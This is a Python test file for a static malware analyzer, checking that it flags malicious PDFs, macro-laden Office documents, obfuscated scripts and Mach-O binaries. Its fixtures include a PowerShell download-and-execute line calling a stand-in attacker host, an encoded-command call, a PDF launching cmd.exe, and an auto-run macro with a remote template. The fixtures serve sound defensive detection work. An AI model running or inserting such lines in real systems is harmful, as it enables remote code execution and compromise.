"""Tests for the added file-type analyzers: PDF, Office maldocs, scripts, Mach-O."""

from __future__ import annotations

import io
import struct
import sys
import zipfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

from aegis.static import analyze_bytes  # noqa: E402
from aegis.static.dispatch import detect_file_type  # noqa: E402
from aegis.static.models import FileType  # noqa: E402


def _ids(report):
    return {i.id for i in report.indicators}


# ── PDF ──────────────────────────────────────────────────────────────────────

def test_pdf_detection_and_active_content():
    pdf = (b"%PDF-1.7\n1 0 obj<</OpenAction<</S/JavaScript/JS(x)>>>>endobj\n"
           b"2 0 obj<</S/Launch/F(cmd.exe)>>endobj\n3 0 obj<</EmbeddedFile 4 0 R>>endobj\n%%EOF")
    r = analyze_bytes(pdf, filename="invoice.pdf")
    assert r.file_type == FileType.PDF
    assert r.pdf.has_javascript and r.pdf.has_openaction and r.pdf.has_launch
    ids = _ids(r)
    assert {"pdf.javascript", "pdf.auto_action", "pdf.launch_action", "pdf.embedded_file"} <= ids


def test_pdf_hex_obfuscated_name_still_detected():
    # /J#61vaScript == /JavaScript
    pdf = b"%PDF-1.5\n1 0 obj<</OpenAction<</S/J#61vaScript/JS(x)>>>>endobj\n%%EOF"
    r = analyze_bytes(pdf, filename="a.pdf")
    assert r.pdf.has_javascript


# ── scripts ──────────────────────────────────────────────────────────────────

def test_powershell_download_exec():
    ps = (b"$u='http://evil.example/x';IEX (New-Object Net.WebClient).DownloadString($u)\n"
          b"powershell -enc ZQBjAGgAbw==")
    r = analyze_bytes(ps, filename="update.ps1")
    assert r.file_type == FileType.SCRIPT and r.script.language == "powershell"
    ids = _ids(r)
    assert "script.download_exec" in ids and "script.encoded_command" in ids


def test_obfuscated_script_flagged():
    blob = "A" * 400  # long base64-ish blob
    js = f"var x='{blob}';var y=String.fromCharCode(97,98,99);".encode()
    r = analyze_bytes(js, filename="a.js")
    assert r.file_type == FileType.SCRIPT
    assert r.script.obfuscation_score >= 0.5
    assert "script.obfuscated" in _ids(r)


def test_script_detected_by_content_without_extension():
    r = analyze_bytes(b"@echo off\r\nstart powershell -enc AAAA\r\n", filename="readme")
    assert r.file_type == FileType.SCRIPT
    assert r.script.language == "batch"


def test_plain_text_is_not_a_script():
    r = analyze_bytes(b"Dear customer,\nThank you for your order.\nRegards.\n", filename="note.txt")
    assert r.file_type == FileType.UNKNOWN


# ── Office maldocs ───────────────────────────────────────────────────────────

def _ooxml_with_macro() -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("[Content_Types].xml", "<Types/>")
        z.writestr("word/document.xml", "<w:document/>")
        z.writestr("word/vbaProject.bin", b"AutoOpen\x00Shell\x00powershell\x00URLDownloadToFile")
        z.writestr("word/_rels/settings.xml.rels",
                   '<Relationships><Relationship Type="attachedTemplate" '
                   'Target="http://evil.example/t.dotm" TargetMode="External"/></Relationships>')
    return buf.getvalue()


def test_ooxml_maldoc_full():
    r = analyze_bytes(_ooxml_with_macro(), filename="resume.docm")
    assert r.file_type == FileType.OFFICE and r.office.container == "ooxml"
    assert r.office.has_macros and "AutoOpen" in r.office.auto_exec
    assert r.office.external_targets == ["http://evil.example/t.dotm"]
    ids = _ids(r)
    assert {"office.macros_present", "office.auto_exec_macro",
            "office.suspicious_macro", "office.remote_template"} <= ids


def test_ole_office_bytescan_fallback():
    ole = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 32
    ole += b"AutoOpen Shell powershell CreateObject Microsoft Word.Document"
    r = analyze_bytes(ole, filename="doc.doc")
    assert r.file_type == FileType.OFFICE and r.office.container == "ole"
    assert r.office.has_macros and "office.auto_exec_macro" in _ids(r)


# ── Mach-O ───────────────────────────────────────────────────────────────────

def _macho_thin() -> bytes:
    name = b"/usr/lib/libSystem.B.dylib\x00"
    name += b"\x00" * ((4 - len(name) % 4) % 4)
    cmdsize = 24 + len(name)
    lc = struct.pack("<II", 0x0C, cmdsize) + struct.pack("<IIII", 24, 0, 0, 0) + name
    hdr = struct.pack("<IiiIIIII", 0xFEEDFACF, 0x01000007, 3, 2, 1, cmdsize, 0, 0)
    return hdr + lc


def test_macho_thin_parse():
    r = analyze_bytes(_macho_thin(), filename="mach.bin")
    assert r.file_type == FileType.MACHO
    assert r.macho.archs == ["x86_64"] and r.macho.filetype == "EXECUTE"
    assert "/usr/lib/libSystem.B.dylib" in r.macho.linked_dylibs
    assert r.macho.is_signed is False
    assert "macho.unsigned" in _ids(r)


def test_macho_fat_archs():
    fat = struct.pack(">II", 0xCAFEBABE, 2)
    fat += struct.pack(">iIIII", 0x01000007, 3, 0, 0, 0)   # x86_64
    fat += struct.pack(">iIIII", 0x0100000C, 0, 0, 0, 0)   # arm64
    r = analyze_bytes(fat, filename="universal")
    assert r.file_type == FileType.MACHO and r.macho.is_fat
    assert set(r.macho.archs) == {"x86_64", "arm64"}


def test_detect_file_type_direct():
    assert detect_file_type(b"%PDF-1.4 ...") == FileType.PDF
    assert detect_file_type(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1rest") == FileType.OFFICE
    assert detect_file_type(_macho_thin()) == FileType.MACHO
    assert detect_file_type(b"MZ\x90\x00") == FileType.PE
